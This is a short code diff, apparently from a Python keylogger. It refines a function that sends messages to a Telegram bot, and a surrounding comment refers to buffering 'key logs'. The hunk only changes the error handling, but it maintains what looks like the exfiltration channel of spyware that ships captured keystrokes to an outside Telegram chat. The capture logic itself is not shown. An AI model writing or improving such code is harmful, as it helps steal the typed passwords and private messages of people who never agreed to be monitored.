@@ -8,8 +8,8 @@ def send_to_telegram(token, chat_id, message):
     payload = {'chat_id': chat_id, 'text': message}
     try:
         requests.post(url, data=payload)
-    except:
-        print(f"Error sending message to Telegram")
+    except requests.RequestException as e:
+        print(f"Error sending message to Telegram: {e}")
 
 # buffer to store key logs to increase performance
 log_buffer = []
